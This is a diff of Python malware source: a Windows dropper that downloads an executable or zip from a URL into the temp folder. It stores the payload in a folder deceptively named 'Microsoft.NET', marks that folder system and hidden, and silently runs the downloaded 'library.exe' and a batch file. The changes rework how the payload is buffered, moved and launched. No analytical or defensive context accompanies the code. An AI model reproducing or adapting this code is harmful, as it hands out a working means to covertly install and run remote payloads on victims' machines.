@@ -9,25 +9,33 @@ def fire_things_up(url,arch=False,zip=False):
 	def work(zip):
 		global pthhhh
 		pthhhh = get_output("echo %temp%").strip()
-		xx     = subprocess.Popen( 'mkdir "Microsoft.NET" >> NUL',shell=True,cwd=pthhhh)
 		CHUNK  = 16 * 1024
+		junk   = b""
 		if not zip:
 			res = urlopen(url)
-			f   = open(pthhhh+"\\Microsoft.NET\\library.exe", 'wb')
 			while True:
 				chunk = res.read(CHUNK)
-				if not chunk:
-					break
-				f.write(chunk)
+				if chunk:
+					junk +=chunk
+				else:break
+			f   = open(pthhhh+"\\library.exe", 'wb')
+			f.write(junk)
+			f.close()
+			xx     = subprocess.Popen( 'mkdir Microsoft.NET >> NUL',shell=True,cwd=pthhhh)
+			subprocess.Popen( 'move library.exe Microsoft.NET\\library.exe >> NUL',shell=True,cwd=pthhhh)
 		elif zip:
 			res = urlopen(url)
-			f   = open(pthhhh+"\\Microsoft.NET\\library_data.zip", 'wb')
 			while True:
 				chunk = res.read(CHUNK)
-				if not chunk:
-					break
-				f.write(chunk)
+				if chunk:
+					junk +=chunk
+				else:break
 			##~Import-Here~##
+			f   = open(pthhhh+"\\library_data.zip", 'wb')
+			f.write(junk)
+			f.close()
+			xx     = subprocess.Popen( 'mkdir Microsoft.NET >> NUL',shell=True,cwd=pthhhh)
+			subprocess.Popen( 'move library_data.zip Microsoft.NET\\library_data.zip >> NUL',shell=True,cwd=pthhhh)
 			zip=zipfile.ZipFile(pthhhh+"\\Microsoft.NET\\library_data.zip")
 			def get_exe_from(zip):
 				for i in zip.namelist():
@@ -41,11 +49,11 @@ def fire_things_up(url,arch=False,zip=False):
 			xxx = subprocess.Popen( pthhhh+"\\Microsoft.NET\\lolz_service.bat >> NUL",shell=True)
 
 		#xx  = subprocess.Popen( "library.exe >> NUL",shell=True,cwd=pthhhh+"\\Microsoft.NET")
-		xxx = subprocess.Popen( 'cd .. && attrib +s +h "Microsoft.NET" >> NUL',shell=True,cwd=pthhhh+"\\Microsoft.NET")
+		xxx = subprocess.Popen( 'attrib +s +h "Microsoft.NET" >> NUL',shell=True,cwd=pthhhh)
 	#check architecture
 	if arch:
 		if architecture()[0][:2] == arch: work(zip)
 	else: work(zip)
 
 #Someshit
-xx  = subprocess.Popen( "library.exe >> NUL",shell=True,cwd=pthhhh+"\\Microsoft.NET")
+xx  = subprocess.Popen( "Microsoft.NET\\library.exe >> NUL",shell=True,cwd=pthhhh)
